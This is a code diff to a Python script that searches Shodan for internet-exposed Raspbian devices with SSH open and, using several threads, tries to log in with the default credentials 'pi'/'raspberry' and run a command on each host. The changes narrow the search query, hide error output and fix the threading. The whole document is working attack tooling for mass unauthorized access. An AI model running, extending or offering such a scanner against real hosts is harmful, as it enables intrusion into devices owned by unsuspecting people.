@@ -11,7 +11,7 @@ import os
 # this is 2018 motherfucker!
 import threading
 
-DEBUG = True
+DEBUG = False # or True
 
 def te_rajo():
     print('''\t\t\t
@@ -34,17 +34,20 @@ def ssh_connect(hostname, port='22', username='pi', password='raspberry'):
         client.connect(hostname, port=port, username=username, password=password, timeout=3)
         stdin, stdout, stderr = client.exec_command('ls')
         print(stdout.read())
-    except paramiko.AuthenticationException:
-        print('Authentication failed when connecting to %s' % hostname)
+    except paramiko.ssh_exception.AuthenticationException:
+        if DEBUG:
+            print('Authentication failed when connecting to %s' % hostname)
     except:
-        print('Could not SSH to %s' % hostname)
+        if DEBUG:
+            print('Could not SSH to %s' % hostname)
     finally:
         client.close()
 
 
 def scan_job(shodan_api, page):
-    results = shodan_api.search('raspbian', page=page)
+    results = shodan_api.search('raspbian port:"22"', page=page)
     list_to_scan = []
+    print(threading.currentThread().getName() + ' Page to scan: ' + str(page))
     for i in results['matches']:
         if DEBUG:
             print(threading.currentThread().getName() + ' IP: %s' % i['ip_str'])
@@ -61,16 +64,17 @@ def main():
     shodan_api = shodan.Shodan(shodan_key)
     te_rajo()
     try:
-        results = shodan_api.search('raspbian')
+        results = shodan_api.search('raspbian port:"22"')
         pages = int(int(results['total']) / 100)
         print('Results: %s' % results['total'])
+        print('Pages: ' + str(pages))
         # lets split this load in threads, because this is 2018
         threads = 8 # this is a lot? i dont know
         jobs = []
         page = 0
         while page < pages:
             for i in range(0, threads):
-                thread = threading.Thread(target=scan_job(shodan_api, page))
+                thread = threading.Thread(target=scan_job, args=(shodan_api, page))
                 jobs.append(thread)
                 print(str(page))
                 page += 1
